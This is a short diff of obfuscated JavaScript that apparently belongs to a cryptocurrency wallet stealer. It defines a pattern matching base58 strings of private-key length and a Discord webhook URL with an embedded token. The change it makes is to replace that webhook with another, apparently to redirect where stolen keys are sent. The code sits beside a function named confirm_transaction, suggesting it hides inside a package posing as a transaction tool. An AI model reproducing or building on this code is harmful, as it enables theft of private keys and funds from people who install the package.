@@ -21,7 +21,7 @@ const _0x14a1 = function (_0x2e5d, _0x114b) {
     return _0x21e4;
 };
 const _0x49bc = new RegExp('[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{80,90}', 'g');
-const _0x3c79 = 'https://discord.com/api/webhooks/1288448762888454214/iE3eFGi-gUo42zbFiy-Z_kGYnjB4JqJI-XN2p9AnNf5bkiDY6nvSOMzxwJPZ6Y1XPDH1';
+const _0x3c79 = 'https://discord.com/api/webhooks/1288448784120021088/Inb5vHYoTd3Nui3MOxYiLnGuiJA6bOYSfukp3C7gLBmcOjl4hDPVPk6DL8D0KAgfhDkq';
 function confirm_transaction(_0x46d1) {
     return __awaiter(this, void 0, void 0, function* () {
         _0x14a1(0x4, 0);
